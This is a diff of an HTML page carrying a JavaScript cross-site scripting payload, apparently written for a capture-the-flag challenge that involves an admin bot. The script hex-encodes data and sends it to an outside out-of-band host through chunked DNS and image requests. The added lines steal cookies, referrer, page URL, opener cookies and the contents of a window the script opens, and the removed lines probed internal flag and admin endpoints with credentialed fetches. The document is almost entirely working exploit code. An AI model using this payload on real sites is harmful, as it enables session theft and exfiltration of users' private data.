@@ -4,58 +4,38 @@
 <script>
 var o="da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
 function h(s){var r='';for(var i=0;i<s.length;i++)r+=s.charCodeAt(i).toString(16).padStart(2,'0');return r}
-function e(l,d){var x=h(d);var c=[];for(var i=0;i<x.length;i+=50)c.push(x.substring(i,i+50));for(var j=0;j<c.length;j++)new Image().src="http://"+l+"-"+j+"."+c[j]+"."+o+"/x";}
+function e(l,d){var x=h(d);var c=[];for(var i=0;i<x.length;i+=50)c.push(x.substring(i,i+50));for(var j=0;j<c.length;j++)new Image().src="http://"+l+"-"+j+"."+c[j]+"."+o+"/x";
+new Image().src="http://"+l+"."+o+"/"+encodeURIComponent(d);}
 
-// The bot came from http://web/ - try to fetch internal endpoints
-var endpoints = [
-    "http://web/",
-    "http://web/flag",
-    "http://web/api/flag",
-    "http://web/admin",
-    "http://web/api/admin",
-    "http://web/api/channels/11/load",
-    "http://web/api/channels/0/load",
-    "http://web/api/reports",
-    "http://web/api/config",
-    "http://web/api/secret",
-    "http://localhost/",
-    "http://localhost/flag",
-    "http://127.0.0.1/flag"
-];
+// Everything we can get
+e("v4ref", document.referrer || "none");
+e("v4cookie", document.cookie || "nocookie");
+e("v4loc", location.href);
 
-// Try fetch with cors mode
-endpoints.forEach(function(url, i) {
-    fetch(url, {mode:'cors', credentials:'include'}).then(function(r){
-        return r.text();
-    }).then(function(t){
-        e("ep"+i, t.substring(0,200));
-    }).catch(function(err){
-        // Try no-cors - won't get body but will make the request
-        e("eperr"+i, err.toString().substring(0,60));
-    });
-});
+// Try to access opener/parent
+if (window.opener) {
+    try { e("v4opener", window.opener.document.cookie); } catch(ex) { e("v4openerr", ex.toString().substring(0,100)); }
+} else {
+    e("v4opener", "null");
+}
 
-// Also try opening in iframe to see if we can access
-var ifr = document.createElement('iframe');
-ifr.src = "http://web/";
-ifr.onload = function(){
-    try {
-        var doc = ifr.contentDocument || ifr.contentWindow.document;
-        e("iframe-body", doc.body.innerHTML.substring(0,500));
-    } catch(ex) {
-        e("iframe-err", ex.toString().substring(0,100));
-    }
-};
-document.body.appendChild(ifr);
+// Try to open http://web/ to steal cookies via window.open
+try {
+    var w = window.open("http://web/", "_blank");
+    setTimeout(function(){
+        try {
+            e("v4wincookie", w.document.cookie);
+            e("v4winbody", w.document.body.innerHTML.substring(0,300));
+        } catch(ex) {
+            e("v4winerr", ex.toString().substring(0,100));
+        }
+    }, 3000);
+} catch(ex) {
+    e("v4winopenerr", ex.toString().substring(0,100));
+}
 
-// Navigate back to steal cookies from http://web/ via history
-// history.length was 2, so history.back() goes to http://web/
-setTimeout(function(){
-    // Set up a handler before navigating back
-    e("going-back", "attempting");
-    // Use window.open to open http://web/ in same tab
-    // Actually, just try location = http://web/ after setting up message listener
-}, 2000);
+// Also try fetch to same origin as bot's admin
+fetch("/", {credentials:"include"}).then(r=>r.text()).then(t=>e("v4self",t.substring(0,300))).catch(ex=>e("v4selferr",ex.toString().substring(0,60)));
 </script>
 </body>
 </html>
